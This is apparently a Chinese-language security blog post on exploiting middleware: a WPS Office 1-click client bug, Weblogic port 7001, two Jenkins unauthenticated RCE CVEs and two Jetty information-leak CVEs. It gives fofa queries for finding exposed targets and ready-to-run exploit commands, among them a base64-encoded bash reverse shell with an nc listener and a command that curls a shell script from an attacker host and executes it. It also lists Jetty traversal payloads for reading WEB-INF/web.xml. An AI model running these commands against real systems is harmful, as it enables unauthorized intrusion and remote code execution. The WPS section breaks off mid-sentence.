---
title: "中间件安全：WPS、Weblogic、Jenkins、Jetty"
pubDate: 2026-08-04
tags:
  - 安全
  - 中间件
---

四个目标里三个能未授权打 RCE，剩下 Jetty 那俩只能算信息泄露——但泄露的也是 `WEB-INF/web.xml` 这种本不该露的东西。中间件默认配置直接上生产、端口对外，再一个老 CVE，等于把 shell 送给对面

## WPS Office RCE（客户端漏洞，1-click）

不是去打服务，是骗用户点一下。WPS 内置 Chromium 浏览器展示在线模板，把 `cefQuery` 本地 API 暴露给页面 JS，域名白名单只要后缀 `*.wps.cn` 就放行。受害者打开 docx 点一下链接，页面 JS 调本地接口实现无提示下载→落地→运行，但"内置浏览器 + 本地 IPC + 松散白名单"

## Weblogic（端口 7001）

fofa：

```
"Error 404-Not Found" && port="7001"
```

历史 CVE 多很多，JRMP/T3/XMLDecoder/JNDI 注入全都有。WeblogicTool(https://github.com/KimJun1010/WeblogicTool/releases) 填 `http://IP:7001` 一把梭。看到 7001 + 报错页 = 先上工具

## Jenkins CVE-2017-1000353（反序列化，未授权 RCE）

CLI 传序列化对象没校验，塞恶意 `SignedObject` 绕黑名单触发反序列化链

```
java -jar CVE-2017-1000353-1.1-SNAPSHOT-all.jar jenkins_poc.ser "bash -c {echo,<base64>}|{base64,-d}|{bash,-i}"
python exploit.py http://目标:端口 jenkins_poc.ser
nc -lvvp 5566
```

## Jenkins CVE-2018-1000861（Stapler 路由+Groovy 编译期，未授权 RCE，）

Stapler 框架 URL PATH 直接映射 public 方法无 ACL，拼 `/securityRealm/.../descriptorByName/.../checkScript` 路由到敏感方法，用 Groovy `@ASTTest`/`@Grab` 在编译期执行绕运行时沙盒：

```
python2 exp.py http://目标:端口/ "curl -o /tmp/1.sh http://攻击机:8888/shell.txt"
python2 exp.py http://目标:端口/ "bash /tmp/1.sh"
```

## Jetty CVE-2021-28169 / CVE-2021-34429（信息泄露）

两个 CVE，payload 一样：

- CVE-2021-28169：双重解码，ConcatServlet/WelcomeFilter 先解码检查再二次解码转发
- CVE-2021-34429：ContextHandler 对 `%u002e`、`%00` 处理不当

fofa：`app="Jetty"`

```
/%2e/WEB-INF/web.xml
/.%00/WEB-INF/web.xml
/%u002e/WEB-INF/web.xml
/static?/WEB-INF/web.xml
/a/b/..%00/WEB-INF/web.xml
```

浏览器或 curl 访问，返回 web.xml 即成功。共性：多次解码、各阶段语义不同 → 路径类漏洞温床

## 要点

中间件漏洞高发区就三类：路径/编码规范化不一致、反序列化、协议或路由设计过度开放。"未授权"决定价值，要登录的 CVE-2019-100300 就比未授权的 CVE-2018-1000861 价值低。工具化实战顺序就是"先识别指纹 → 上工具批量测 → 工具不行再回头看原理"
